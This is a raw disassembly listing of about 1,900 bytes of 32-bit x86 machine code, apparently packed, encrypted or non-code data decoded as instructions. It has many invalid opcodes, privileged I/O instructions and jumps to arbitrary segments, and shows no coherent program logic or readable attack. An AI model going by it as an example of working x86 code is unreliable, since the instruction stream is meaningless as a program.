  4187b2:	or     eax,DWORD PTR ds:0x917cae9a
  4187b8:	arpl   WORD PTR [ebp+0x1c],cx
  4187bb:	sub    eax,0xace44cc8
  4187c0:	add    edx,ecx
  4187c2:	push   esi
  4187c3:	xchg   esp,eax
  4187c4:	cmp    al,BYTE PTR [esi]
  4187c6:	repz rcr BYTE PTR ds:0xe27fbad1,1
  4187cd:	ds cs into 
  4187d0:	sbb    ebx,DWORD PTR [ecx-0x7d]
  4187d3:	sbb    al,0xa5
  4187d5:	jmp    0x4fff:0x8a7ddf0f
  4187dc:	test   eax,0x301a101a
  4187e1:	ins    DWORD PTR es:[edi],dx
  4187e2:	sub    al,0x77
  4187e4:	mov    DWORD PTR [ecx],esi
  4187e6:	aaa    
  4187e7:	(bad)  
  4187e8:	pop    edx
  4187e9:	dec    ecx
  4187ea:	fist   WORD PTR [ecx-0x4a]
  4187ed:	loop   0x41881e
  4187ef:	test   eax,0x13c6d759
  4187f4:	sti    
  4187f5:	call   0x426a1c66
  4187fa:	cmc    
  4187fb:	xor    DWORD PTR [ecx+edx*1+0x6b003e3b],0x38
  418803:	jp     0x41882a
  418805:	or     BYTE PTR [eax-0x1258ed05],cl
  41880b:	jb     0x418833
  41880d:	push   0x29770595
  418812:	push   edi
  418813:	ins    BYTE PTR es:[edi],dx
  418814:	lahf   
  418815:	dec    edi
  418816:	adc    DWORD PTR [esi+0x696f46d3],0xffffff9c
  41881d:	in     al,0x4a
  41881f:	jmp    0x4187f8
  418821:	pop    ss
  418822:	dec    ebx
  418823:	lea    esp,ds:0xeefe448a
  418829:	inc    ecx
  41882a:	xchg   DWORD PTR [eax-0xfd02357],eax
  418830:	inc    eax
  418831:	popf   
  418832:	mov    ah,0xba
  418834:	outs   dx,DWORD PTR ds:[esi]
  418835:	popa   
  418836:	or     eax,0xcc655ee0
  41883b:	bound  edi,QWORD PTR [eax+0xc142e7a]
  418841:	pop    es
  418842:	push   esp
  418843:	xchg   ch,bh
  418845:	or     eax,0x6fa7013d
  41884a:	adc    eax,0x81dc313f
  41884f:	push   ebp
  418850:	dec    ebp
  418851:	inc    ebx
  418852:	call   0xe38c2194
  418857:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418858:	fxch   st(0)
  41885a:	pusha  
  41885b:	mov    edx,0x3861981c
  418860:	pop    esp
  418861:	sub    DWORD PTR [ebx+0x6686b8a2],eax
  418867:	sub    eax,0x65764bc2
  41886c:	repnz sub bh,BYTE PTR [esi-0x45]
  418870:	(bad)  
  418871:	(bad)  
  418872:	call   0xf8719542
  418877:	sub    eax,0x74d1edd
  41887c:	xor    eax,0x2e3b1f3a
  418881:	sti    
  418882:	or     eax,0xdd3e1981
  418887:	(bad)  
  418888:	push   ebp
  418889:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41888a:	or     al,0xb1
  41888c:	xchg   ebp,eax
  41888d:	aaa    
  41888e:	or     DWORD PTR [ebx+ecx*8-0x4bf430f8],edi
  418895:	and    cl,ch
  418897:	and    edi,DWORD PTR [eax-0x68]
  41889a:	or     edx,DWORD PTR [edx+0x7d]
  41889d:	rol    ah,cl
  41889f:	xor    BYTE PTR [edi],0x3
  4188a2:	lock add al,0x52
  4188a5:	sti    
  4188a6:	jno    0x418855
  4188a8:	loope  0x418873
  4188aa:	ins    BYTE PTR es:[edi],dx
  4188ab:	(bad)  
  4188ac:	jg     0x41883f
  4188ae:	or     DWORD PTR [ecx+esi*8],esi
  4188b1:	arpl   WORD PTR [edx],bp
  4188b3:	(bad)  
  4188b4:	jecxz  0x418902
  4188b6:	sub    edi,DWORD PTR [ecx+0x32]
  4188b9:	sbb    eax,0xf23edad9
  4188be:	inc    edx
  4188bf:	push   edx
  4188c0:	mov    eax,0x445fc4bd
  4188c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188c6:	inc    edx
  4188c7:	clc    
  4188c8:	mov    DWORD PTR ds:[ebp+0x1b],eax
  4188cc:	outs   dx,BYTE PTR ds:[esi]
  4188cd:	repnz out dx,al
  4188cf:	cwde   
  4188d0:	in     al,dx
  4188d1:	pop    ebx
  4188d2:	push   edi
  4188d3:	int    0xe
  4188d5:	fimul  WORD PTR [ecx+0x6e]
  4188d8:	push   0xd245a609
  4188dd:	mov    ds:0x9b9b8b23,eax
  4188e2:	inc    esi
  4188e3:	jne    0x418941
  4188e5:	xor    ecx,ebp
  4188e7:	bnd ja 0x4188ce
  4188ea:	jmp    0x418915
  4188ec:	inc    sp
  4188ee:	(bad)  
  4188f0:	loope  0x418879
  4188f2:	das    
  4188f3:	pop    ecx
  4188f4:	or     eax,0x70f9e4bb
  4188f9:	(bad)  
  4188fa:	mov    ch,0xd6
  4188fc:	adc    eax,0x819b8a3e
  418901:	std    
  418902:	aad    0x7f
  418904:	mov    al,BYTE PTR [edx-0x4c]
  418907:	aam    0x44
  418909:	loop   0x41890b
  41890b:	popa   
  41890c:	mov    esi,DWORD PTR [ebp+ecx*2+0x12]
  418910:	sub    edi,DWORD PTR [ecx]
  418912:	or     eax,0x987cbe52
  418917:	imul   esp,esi,0x99cb1170
  41891d:	and    al,0x2a
  41891f:	push   ss
  418920:	into   
  418921:	aad    0x8a
  418923:	in     al,dx
  418924:	out    0xe6,al
  418926:	in     eax,dx
  418927:	ss xchg ebx,ebx
  41892a:	in     al,0x2d
  41892c:	out    0x51,al
  41892e:	and    dl,BYTE PTR [ebx-0x79]
  418931:	sbb    BYTE PTR [ecx],bh
  418933:	inc    edi
  418934:	popf   
  418935:	mov    ebp,0xca68d4e8
  41893a:	into   
  41893b:	pmulhw mm3,QWORD PTR [eax]
  41893e:	xchg   ebx,eax
  41893f:	adc    eax,0xe5bcb501
  418944:	mov    esi,0x34722ae0
  418949:	adc    ebp,esi
  41894b:	popf   
  41894c:	push   ds
  41894d:	(bad)  
  41894e:	sub    ebp,ebx
  418950:	ins    BYTE PTR es:[edi],dx
  418951:	add    al,0xcb
  418953:	(bad)  
  418955:	sbb    ah,bl
  418957:	cmp    dh,bl
  418959:	push   ss
  41895a:	mov    dl,0xe7
  41895c:	ret    
  41895d:	clc    
  41895e:	(bad)  
  41895f:	dec    BYTE PTR [ebp-0x31]
  418962:	in     eax,0xa0
  418964:	cld    
  418965:	out    0xad,eax
  418967:	jle    0x41893a
  418969:	push   es
  41896a:	dec    ecx
  41896b:	mov    bl,0xad
  41896d:	jg     0x41891f
  41896f:	sbb    eax,0xfc22e36f
  418974:	ret    
  418975:	call   0x9d53:0x13039eac
  41897c:	shl    al,0x6a
  41897f:	pushf  
  418980:	push   cs
  418981:	lea    ecx,[ecx]
  418983:	leave  
  418984:	inc    ebp
  418985:	(bad)  
  418986:	xlat   BYTE PTR ds:[ebx]
  418987:	imul   DWORD PTR [ecx]
  418989:	stos   DWORD PTR es:[edi],eax
  41898a:	dec    esi
  41898b:	(bad)  
  41898d:	(bad)  
  41898e:	push   ds
  41898f:	mov    esp,0xe4bff23b
  418994:	mov    esp,0x58bfdd7b
  418999:	(bad)  
  41899a:	shr    DWORD PTR [edx],cl
  41899c:	enter  0xfa63,0x55
  4189a0:	mov    ch,0x6b
  4189a2:	sbb    al,0x7a
  4189a4:	daa    
  4189a5:	cmp    eax,0xc19ac687
  4189aa:	shl    edx,1
  4189ac:	bound  ebp,QWORD PTR [ebp+0x31]
  4189af:	cmp    bl,ah
  4189b1:	mov    BYTE PTR [ebp+0x54],0xda
  4189b5:	iret   
  4189b6:	pop    ss
  4189b7:	or     BYTE PTR [esi+eiz*4+0x49a0cab6],0x8a
  4189bf:	popa   
  4189c0:	pop    ss
  4189c1:	jmp    0x418978
  4189c3:	mov    ch,0x1
  4189c5:	std    
  4189c6:	sbb    ecx,0x6f
  4189c9:	call   DWORD PTR [edx+edi*1]
  4189cc:	mov    DWORD PTR [eax],edx
  4189ce:	iret   
  4189cf:	leave  
  4189d0:	popa   
  4189d1:	mov    eax,ds:0xa58cdcc4
  4189d6:	adc    eax,0xa2770b92
  4189db:	sub    eax,0x3cc57685
  4189e0:	mov    eax,0x1d0248c8
  4189e5:	fild   DWORD PTR [ebx+0x9f9e5a7]
  4189eb:	mov    dh,0xb4
  4189ed:	jge    0x418a35
  4189ef:	int3   
  4189f0:	push   ds
  4189f1:	in     al,dx
  4189f2:	pop    eax
  4189f3:	shl    BYTE PTR [edi-0x7bac7744],cl
  4189f9:	fcom   QWORD PTR [ecx+0x2a5eb29f]
  4189ff:	xlat   BYTE PTR ds:[ebx]
  418a00:	pop    esp
  418a01:	into   
  418a02:	fucomp st(4)
  418a04:	pop    es
  418a05:	sub    DWORD PTR [ecx-0x2558a792],edi
  418a0b:	sar    BYTE PTR [edi+eax*4],0xdc
  418a0f:	or     BYTE PTR [eax],dl
  418a11:	push   ecx
  418a12:	pop    esi
  418a13:	out    0xe2,al
  418a15:	idiv   DWORD PTR ds:0x274e55ac
  418a1b:	cmp    bh,dh
  418a1d:	imul   ecx,edi,0x54
  418a20:	dec    eax
  418a21:	dec    edx
  418a22:	and    dh,al
  418a24:	repz xor DWORD PTR [ecx+0x19e0786c],eax
  418a2b:	push   edx
  418a2c:	xor    dh,BYTE PTR [eax+0x28]
  418a2f:	push   edi
  418a30:	adc    eax,DWORD PTR [edx-0x42]
  418a33:	add    bl,BYTE PTR [eax+0x7c]
  418a36:	push   ebx
  418a37:	inc    esi
  418a38:	pop    eax
  418a39:	ret    0xe60c
  418a3c:	mov    ebx,0xb213b5b0
  418a41:	push   esp
  418a42:	sbb    BYTE PTR ds:0x985de532,ah
  418a48:	sub    cl,BYTE PTR [edx]
  418a4a:	shl    BYTE PTR [eax],0x16
  418a4d:	and    al,0x78
  418a4f:	fnstsw WORD PTR [ebx+0x4f]
  418a52:	int3   
  418a53:	in     eax,dx
  418a54:	sti    
  418a55:	pop    edx
  418a56:	adc    al,0xe7
  418a58:	inc    esi
  418a59:	cmp    edx,DWORD PTR [edx+0x3a]
  418a5c:	sahf   
  418a5d:	or     BYTE PTR ds:0xcc86f73a,al
  418a63:	xor    eax,DWORD PTR [eax+0x39e8f559]
  418a69:	and    al,BYTE PTR [edi]
  418a6b:	push   ebp
  418a6c:	(bad)  
  418a6d:	sbb    eax,0x1cf85390
  418a72:	enter  0x8569,0xba
  418a76:	xor    BYTE PTR [ebx+0x4f37d95d],dh
  418a7c:	pop    esp
  418a7d:	pushf  
  418a7e:	and    eax,0x66b93665
  418a83:	add    DWORD PTR [edx+0x71],ebx
  418a86:	ss or  al,0x2
  418a89:	mov    ?,WORD PTR [ebx]
  418a8b:	mov    dl,ch
  418a8d:	or     BYTE PTR [eax],bl
  418a8f:	mov    edx,0xec0b99b6
  418a94:	(bad)  
  418a95:	cmc    
  418a96:	cld    
  418a97:	js     0x418b17
  418a99:	fcomp  DWORD PTR [edi-0x60]
  418a9c:	mov    dh,0xdc
  418a9e:	or     eax,0xa573c27b
  418aa3:	aaa    
  418aa4:	mov    ch,0xc5
  418aa6:	jb     0x418ad4
  418aa8:	adc    DWORD PTR [edi-0x6b],ecx
  418aab:	(bad)  
  418aac:	lock pop edx
  418aae:	and    DWORD PTR [esi],esp
  418ab0:	fdivr  QWORD PTR [esi]
  418ab2:	and    eax,0xe6ec95f7
  418ab7:	fdivr  DWORD PTR [edx-0x3760d599]
  418abd:	ret    0x8fd6
  418ac0:	jo     0x418a97
  418ac2:	arpl   bx,bp
  418ac4:	pop    ss
  418ac5:	hlt    
  418ac6:	in     al,dx
  418ac7:	leave  
  418ac8:	cmp    eax,0xadabad83
  418acd:	adc    edi,0x49
  418ad0:	adc    eax,0x2582ba32
  418ad5:	and    BYTE PTR [ebp-0x24fd64df],bh
  418adb:	inc    ebx
  418adc:	mov    bl,0xe5
  418ade:	adc    ebx,ebp
  418ae0:	cmp    al,0xd0
  418ae2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ae3:	adc    edi,DWORD PTR [eax-0x756a70a2]
  418ae9:	cwde   
  418aea:	(bad)  
  418aeb:	dec    edi
  418aec:	xchg   esp,eax
  418aed:	xor    ebp,DWORD PTR [ecx]
  418aef:	lahf   
  418af0:	pop    ss
  418af1:	aad    0xa8
  418af3:	mov    dh,0x4
  418af5:	jno    0x418b0b
  418af7:	push   edi
  418af8:	lods   eax,DWORD PTR ds:[esi]
  418af9:	jmp    0x418ab0
  418afb:	jnp    0x418b15
  418afd:	scas   al,BYTE PTR es:[edi]
  418afe:	sti    
  418aff:	sub    DWORD PTR [ebp+0x16ac8451],eax
  418b05:	xor    DWORD PTR [ebx+0x2099bcfb],ecx
  418b0b:	fcmovne st,st(6)
  418b0d:	in     al,0xc7
  418b0f:	pop    ebx
  418b10:	mov    ch,0x9e
  418b12:	hlt    
  418b13:	push   cs
  418b14:	fstp   st(5)
  418b16:	push   ebp
  418b17:	inc    esp
  418b18:	(bad)  
  418b19:	xchg   ebp,eax
  418b1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b1b:	xchg   ecx,eax
  418b1c:	push   ebp
  418b1d:	fdivr  st(2),st
  418b1f:	mov    ds:0x112017a,al
  418b24:	test   eax,0x472b4d3
  418b29:	inc    edx
  418b2a:	dec    edx
  418b2b:	ins    BYTE PTR es:[edi],dx
  418b2c:	and    si,WORD PTR [esi]
  418b2f:	data16 cmp ch,BYTE PTR [edi]
  418b32:	in     eax,dx
  418b33:	mov    dh,ah
  418b35:	adc    edi,ebx
  418b37:	xlat   BYTE PTR ds:[ebx]
  418b38:	gs fwait
  418b3a:	mov    dl,0x58
  418b3c:	jg     0x418ba4
  418b3e:	mov    ecx,0xdbd73ae
  418b43:	(bad)  
  418b44:	loopne 0x418bac
  418b46:	lods   eax,DWORD PTR ds:[esi]
  418b47:	jb     0x418b2b
  418b49:	in     al,dx
  418b4a:	stos   DWORD PTR es:[edi],eax
  418b4b:	xchg   esi,eax
  418b4c:	mov    bh,dh
  418b4e:	sti    
  418b4f:	or     eax,0x8ef848a0
  418b54:	and    DWORD PTR [eax-0x7a8ea15],ebp
  418b5a:	stc    
  418b5b:	mov    ds,WORD PTR [esi+edi*1]
  418b5e:	mov    BYTE PTR [eax+eiz*4+0x7f437ea],ah
  418b65:	inc    ecx
  418b66:	xor    cl,bl
  418b68:	adc    dh,BYTE PTR [edx]
  418b6a:	xchg   ebp,eax
  418b6b:	fwait
  418b6c:	jecxz  0x418b14
  418b6e:	and    dh,BYTE PTR [ebp+0x3657693]
  418b74:	call   0xcca2:0x3870b3
  418b7b:	cmp    ah,BYTE PTR ds:[eax-0x5c]
  418b7f:	test   DWORD PTR [ebx-0x5f5c8a77],eax
  418b85:	dec    ebx
  418b86:	cli    
  418b87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b88:	in     al,0xb6
  418b8a:	ficom  DWORD PTR [eax]
  418b8c:	std    
  418b8d:	push   eax
  418b8e:	dec    eax
  418b8f:	push   esp
  418b90:	jae    0x418b74
  418b92:	daa    
  418b93:	mov    bl,0x29
  418b95:	xor    eax,0x41eefbbd
  418b9a:	jecxz  0x418c12
  418b9c:	div    DWORD PTR [ebp-0x107e498d]
  418ba2:	inc    ebp
  418ba3:	out    0x25,al
  418ba5:	rcl    DWORD PTR [edi],0x70
  418ba8:	sub    al,BYTE PTR [esi-0x5ffe47e6]
  418bae:	bound  ecx,QWORD PTR [ebx]
  418bb0:	js     0x418bc3
  418bb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bb3:	jmp    0x10dc032e
  418bb8:	inc    esi
  418bb9:	scas   eax,DWORD PTR es:[edi]
  418bba:	fcom   st(4)
  418bbc:	dec    esp
  418bbd:	jns    0x418c05
  418bbf:	fidiv  DWORD PTR [ecx-0x4d77e1e9]
  418bc5:	data16 add bl,bl
  418bc8:	imul   esp,DWORD PTR [ebx+0x28],0x19
  418bcc:	sub    al,0xb1
  418bce:	icebp  
  418bcf:	fmul   QWORD PTR [edx+0xf]
  418bd2:	pop    eax
  418bd3:	lahf   
  418bd4:	data16 lods al,BYTE PTR ds:[esi]
  418bd6:	into   
  418bd7:	and    DWORD PTR [ecx+0x47855600],0x3c
  418bde:	pop    ss
  418bdf:	push   esp
  418be0:	lods   eax,DWORD PTR ds:[esi]
  418be1:	lahf   
  418be2:	sub    BYTE PTR [ecx-0x7e],dl
  418be5:	retf   
  418be6:	cmp    al,0xdb
  418be8:	in     eax,dx
  418be9:	shl    DWORD PTR [ecx-0x47304bda],1
  418bef:	sti    
  418bf0:	mov    ds,WORD PTR [eax-0x6db8d9e5]
  418bf6:	push   ebp
  418bf7:	mov    esi,0xf78b30a2
  418bfc:	jo     0x418bc5
  418bfe:	das    
  418bff:	into   
  418c00:	dec    edx
  418c01:	fwait
  418c02:	test   DWORD PTR ds:0x790ddcb,ebp
  418c08:	push   DWORD PTR ds:0x8e71efb4
  418c0e:	adc    al,0xa4
  418c10:	pop    edi
  418c11:	cs cwde 
  418c13:	sub    ch,dh
  418c15:	ret    
  418c16:	test   eax,0x2067a89f
  418c1b:	mov    edx,0xfedb50c6
  418c20:	bound  edx,QWORD PTR [ebx+0x4d548032]
  418c26:	push   es
  418c27:	scas   eax,DWORD PTR es:[edi]
  418c28:	pop    sp
  418c2a:	outs   dx,DWORD PTR ds:[esi]
  418c2b:	les    ebx,FWORD PTR [ecx]
  418c2d:	leave  
  418c2e:	adc    al,0x97
  418c30:	sbb    al,BYTE PTR [esi-0x4a]
  418c33:	jb     0x418c5c
  418c35:	xor    al,0x59
  418c37:	mov    DWORD PTR [ebp-0x65],ebx
  418c3a:	stc    
  418c3b:	xchg   ah,dh
  418c3d:	ins    BYTE PTR es:[edi],dx
  418c3e:	and    al,0x66
  418c40:	jno    0x418cad
  418c42:	mov    ecx,DWORD PTR [ebx+0x6e]
  418c45:	sbb    esp,ebp
  418c47:	fxtract 
  418c49:	add    bh,dl
  418c4b:	xchg   edx,eax
  418c4c:	inc    edx
  418c4d:	iret   
  418c4e:	dec    ebx
  418c4f:	scas   al,BYTE PTR es:[edi]
  418c50:	and    al,0x76
  418c52:	pop    eax
  418c53:	mov    esp,0xe18f4a9
  418c58:	loop   0x418be0
  418c5a:	adc    esp,DWORD PTR [ebx-0x7ca9f684]
  418c60:	int3   
  418c61:	sub    DWORD PTR [eax-0x3b],esi
  418c64:	and    BYTE PTR [edx-0x5a28100a],ah
  418c6a:	outs   dx,BYTE PTR ds:[esi]
  418c6b:	pop    ebx
  418c6c:	cmp    DWORD PTR [esi+eiz*2+0x70],edx
  418c70:	or     BYTE PTR [edi-0x22],bl
  418c73:	loop   0x418c5b
  418c75:	lar    edi,WORD PTR ds:0x836442a4
  418c7c:	das    
  418c7d:	mov    WORD PTR [esi],es
  418c7f:	jnp    0x418c93
  418c81:	(bad)  
  418c82:	popa   
  418c83:	push   es
  418c84:	sub    bh,ch
  418c86:	jnp    0x418c3f
  418c88:	jne    0x418c2f
  418c8a:	xor    DWORD PTR [esp+edx*1+0xc],edx
  418c8e:	(bad)  
  418c92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c93:	cvtpi2ps xmm0,QWORD PTR [ebx]
  418c96:	add    DWORD PTR [ebx],edi
  418c98:	xor    DWORD PTR [edx-0x25118dea],eax
  418c9e:	scas   al,BYTE PTR es:[edi]
  418c9f:	jecxz  0x418cc6
  418ca1:	adc    esp,ebp
  418ca3:	mov    bh,bh
  418ca5:	int    0x35
  418ca7:	push   es
  418ca8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ca9:	pop    edi
  418caa:	push   esi
  418cab:	inc    esi
  418cac:	jne    0x418ce1
  418cae:	cmp    al,BYTE PTR [edx-0x80]
  418cb1:	inc    esp
  418cb2:	push   eax
  418cb3:	cmp    ah,BYTE PTR [edx]
  418cb5:	xchg   esi,eax
  418cb6:	xor    BYTE PTR [ebx+eax*4+0x37bf9866],0x28
  418cbe:	adc    eax,0x9d318af0
  418cc3:	or     DWORD PTR [eax+0x2af9f268],ebx
  418cc9:	(bad)  
  418cca:	adc    ch,ah
  418ccc:	(bad)  
  418cce:	jle    0x418cc6
  418cd0:	and    ebx,DWORD PTR [ecx-0x45ee088f]
  418cd6:	call   0xdbc6:0x6f0008e3
  418cdd:	and    dl,al
  418cdf:	adc    dh,BYTE PTR [esi-0x1434dd63]
  418ce5:	sub    ebp,esi
  418ce7:	xor    ecx,DWORD PTR [esi+ecx*2]
  418cea:	push   eax
  418ceb:	popf   
  418cec:	retf   0xf77b
  418cef:	ficom  DWORD PTR [eax-0x5875c0c6]
  418cf5:	dec    eax
  418cf6:	xchg   BYTE PTR [edi],bl
  418cf8:	mov    bl,0x6e
  418cfa:	cmp    DWORD PTR [ebx],ecx
  418cfc:	in     eax,dx
  418cfd:	(bad)  
  418cfe:	mov    esi,0x5e29d16b
  418d03:	cmc    
  418d04:	or     BYTE PTR [edx*1+0x1eff5780],0xe7
  418d0c:	add    eax,0x564c27b5
  418d11:	outs   dx,DWORD PTR ds:[esi]
  418d12:	xchg   BYTE PTR [esi+0x123a97c6],dh
  418d18:	cmp    esi,DWORD PTR es:[edx-0x223c7065]
  418d1f:	rcl    bl,0x46
  418d22:	push   ebx
  418d23:	hlt    
  418d24:	mov    ecx,0xf143980d
  418d29:	pop    ebp
  418d2a:	out    dx,al
  418d2b:	mov    al,ds:0x29a86ff2
  418d30:	leave  
  418d31:	loopne 0x418d74
  418d33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d34:	pusha  
  418d35:	pop    ds
  418d36:	dec    eax
  418d37:	push   ss
  418d38:	mov    esp,0x4c72b283
  418d3d:	shl    bh,cl
  418d3f:	outs   dx,BYTE PTR ds:[esi]
  418d40:	rcl    DWORD PTR [ebx],cl
  418d42:	lahf   
  418d43:	dec    ebp
  418d44:	mov    ebx,0x2b84639b
  418d49:	jge    0x418cda
  418d4b:	mov    bl,0x20
  418d4d:	inc    ebx
  418d4e:	shr    al,0xd6
  418d51:	sbb    al,0x3e
  418d53:	mov    bl,0xa6
  418d55:	imul   edx,DWORD PTR [ebp+0x5752fff2],0xffffffa7
  418d5c:	adc    eax,0x7dd12381
  418d61:	push   eax
  418d62:	push   eax
  418d63:	fidivr DWORD PTR [eax+esi*2+0x30c08928]
  418d6a:	xchg   edi,eax
  418d6b:	ins    DWORD PTR es:[edi],dx
  418d6c:	cmp    eax,0x6ba45bba
  418d71:	inc    ebp
  418d72:	cmp    DWORD PTR [eax-0x6a],0x31e35e76
  418d79:	xor    BYTE PTR [ecx],dh
  418d7b:	xchg   DWORD PTR [ecx+eax*2],ebp
  418d7e:	sub    dh,al
  418d80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d81:	pop    edx
  418d82:	xchg   edi,eax
  418d83:	jne    0x418d40
  418d85:	cmp    al,0xdf
  418d87:	xchg   ebx,eax
  418d88:	test   al,0x18
  418d8a:	pop    edi
  418d8b:	push   cs
  418d8c:	gs ins BYTE PTR es:[edi],dx
  418d8e:	repz hlt 
  418d90:	cs (bad) 
  418d92:	sti    
  418d93:	mov    ch,0x38
  418d95:	aas    
  418d96:	enter  0xd536,0x24
  418d9a:	adc    DWORD PTR [ebx+0x71e5c90a],esp
  418da0:	xchg   DWORD PTR [edx+0x33],ebp
  418da3:	call   0xb17f:0x64ddcf39
  418daa:	lods   eax,DWORD PTR ds:[esi]
  418dab:	add    BYTE PTR [esi+0x64],0x59
  418daf:	mov    eax,ds:0xcd12ebc0
  418db4:	mov    al,ds:0x4da40b50
  418db9:	(bad)  
  418dbb:	ja     0x418d9b
  418dbd:	test   ebx,eax
  418dbf:	mov    ds:0x2f3036e7,eax
  418dc4:	in     al,0x99
  418dc6:	(bad)  [ecx-0x532e5]
  418dcc:	retf   0xb436
  418dcf:	jns    0x418dd5
  418dd1:	cmp    eax,0x70ca27c6
  418dd6:	push   0x3a
  418dd8:	sahf   
  418dd9:	cmp    DWORD PTR [esi-0x3fff35ef],ecx
  418ddf:	cmp    BYTE PTR [edx],0xda
  418de2:	gs dec edx
  418de4:	add    eax,0xf925a5b4
  418de9:	retf   
  418dea:	mov    bh,0x5e
  418dec:	aaa    
  418ded:	cli    
  418dee:	push   esi
  418def:	add    al,0x76
  418df1:	mov    cl,0xbc
  418df3:	data16 mov dl,0x39
  418df6:	and    al,0xf9
  418df8:	and    al,BYTE PTR [ecx+0x63e5f0f5]
  418dfe:	paddb  mm4,QWORD PTR [ebp+0x3e2ec5f7]
  418e05:	clc    
  418e06:	jns    0x418e47
  418e08:	icebp  
  418e09:	jmp    0x9bfd:0x35466220
  418e10:	jb     0x418d9d
  418e12:	fwait
  418e13:	cmp    BYTE PTR [ebx+ecx*1-0x29d9ce9f],ah
  418e1a:	add    BYTE PTR [edx-0x64],cl
  418e1d:	pop    esi
  418e1e:	push   ss
  418e1f:	iret   
  418e20:	loopne 0x418df0
  418e22:	test   eax,0xc6c92e72
  418e27:	lock cmp ebp,edi
  418e2a:	sbb    DWORD PTR [edx],ebp
  418e2c:	jge    0x418deb
  418e2e:	jo     0x418e4b
  418e30:	jne    0x418e4c
  418e32:	test   DWORD PTR [edi+0x64e46fec],0x4a3f1fe3
  418e3c:	retf   
  418e3d:	lahf   
  418e3e:	mov    ds:0xe4290c30,eax
  418e43:	les    eax,FWORD PTR [ebp*4+0x777e45f9]
  418e4a:	push   ebp
  418e4b:	(bad)  
  418e4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e4d:	lea    esi,[eax+eax*1+0x23012c43]
  418e54:	nop
  418e55:	adc    ecx,DWORD PTR [eax-0x347f6e96]
  418e5b:	cmc    
  418e5c:	sub    dl,BYTE PTR [ecx-0x65]
  418e5f:	imul   esp,DWORD PTR [esi+0x72],0xba201f38
  418e66:	imul   eax,ecx,0x57
  418e69:	mov    esi,0xde1a3341
  418e6e:	and    dl,BYTE PTR [ebp-0x70]
  418e71:	dec    esi
  418e72:	dec    edi
  418e73:	lahf   
  418e74:	in     eax,dx
  418e75:	in     al,0xb8
  418e77:	call   0x6d14:0xd0ca595
  418e7e:	lea    eax,[ebp+eiz*4-0xa00cb1a]
  418e85:	rcr    edi,0xb9
  418e88:	add    DWORD PTR [ecx],0xc6472c1a
  418e8e:	stos   DWORD PTR es:[edi],eax
  418e8f:	pop    edi
  418e90:	or     eax,0xdf41a50e
  418e95:	repz repnz dec edi
  418e98:	mov    bl,0x7c
  418e9a:	push   eax
  418e9b:	and    eax,DWORD PTR [ebx]
  418e9d:	outs   dx,BYTE PTR ds:[esi]
  418e9e:	jb     0x418e56
  418ea0:	lock sahf 
  418ea2:	popf   
  418ea3:	cli    
  418ea4:	dec    ecx
  418ea5:	int    0xbb
  418ea7:	mov    WORD PTR [ebx-0x4d913322],es
  418ead:	sbb    eax,0x2e784b3f
  418eb2:	or     al,BYTE PTR [ecx+0x162b26be]
  418eb8:	stos   DWORD PTR es:[edi],eax
  418eb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418eba:	push   edi
  418ebb:	ins    BYTE PTR es:[edi],dx
  418ebc:	jp     0x418f31
  418ebe:	lock adc bh,ah
  418ec1:	es or  eax,0xca6d7494
  418ec7:	cmc    
  418ec8:	pushf  
  418ec9:	lea    edx,[ebp+0xccb8882]
  418ecf:	dec    edi
  418ed0:	pop    esp
  418ed1:	(bad)  
  418ed2:	cwde   
  418ed3:	repz popf 
  418ed5:	mov    ecx,0x75be4bcb
  418eda:	imul   edi,DWORD PTR [esi+0x56241505],0xffffffe4
  418ee1:	cmp    dh,BYTE PTR [ecx*2-0x736be66d]
  418ee8:	pop    esi
  418ee9:	les    edx,FWORD PTR [ebx+eax*2-0x4f]
  418eed:	xor    DWORD PTR [edx+0x3aa0451e],0xbf3514e8
  418ef7:	aas    
  418ef8:	(bad)  
  418ef9:	cdq    
  418efa:	sub    bl,BYTE PTR [ecx+edi*2+0x3d5195c1]
  418f01:	fsub   QWORD PTR [ebp-0x16503961]
  418f07:	test   al,0xaa
  418f09:	(bad)
  418f0f:	mov    al,0x3b
  418f11:	sbb    cl,BYTE PTR [ebx+0x40]
  418f14:	scas   al,BYTE PTR es:[edi]
  418f15:	adc    BYTE PTR [ebx],bh
  418f17:	push   esi
  418f18:	inc    eax
  418f19:	dec    ebp
  418f1a:	outs   dx,BYTE PTR ds:[esi]
  418f1b:	mov    esp,0xe454593c
  418f20:	cmp    DWORD PTR [ebp-0x23756b73],ebp
  418f26:	nop
  418f27:	mov    ch,0x6a
  418f29:	aam    0x2b
  418f2b:	and    edi,edx
  418f2d:	push   0xd32bf8f6
  418f32:	push   eax
  418f33:	test   DWORD PTR [edi+0x2553f898],edx
  418f39:	cmp    DWORD PTR [eax-0x34],ecx
  418f3c:	mov    esi,0x90c0d40a
  418f41:	loop   0x418eda
  418f43:	dec    edi
  418f44:	lds    ebp,FWORD PTR [edx+0x5bc09c75]
  418f4a:	bound  edx,QWORD PTR [esi]
  418f4c:	mov    cl,0xbf
  418f4e:	adc    eax,0x58ac74bb
  418f53:	cdq    
  418f54:	imul   ebx,DWORD PTR [ebp+eiz*4-0x80],0x9e2ede82
  418f5c:	adc    bl,BYTE PTR [esi]
  418f5e:	mov    bl,0xd2
  418f60:	dec    edx
  418f61:	sar    DWORD PTR [edi+0x2b],1
  418f64:	inc    ebx
  418f65:	fcomp  DWORD PTR [edx-0x1d]
  418f68:	xlat   BYTE PTR ds:[ebx]
  418f69:	jne    0x418f13
  418f6b:	mov    ah,BYTE PTR [esi]
  418f6d:	xor    BYTE PTR [edx],ah
  418f6f:	out    dx,al
  418f70:	adc    DWORD PTR [ecx+0x1b],ecx
  418f73:	fisubr WORD PTR [edx-0x4e8fb060]
  418f79:	jne    0x418fab
  418f7b:	aas    
  418f7c:	leave  
  418f7d:	sti    
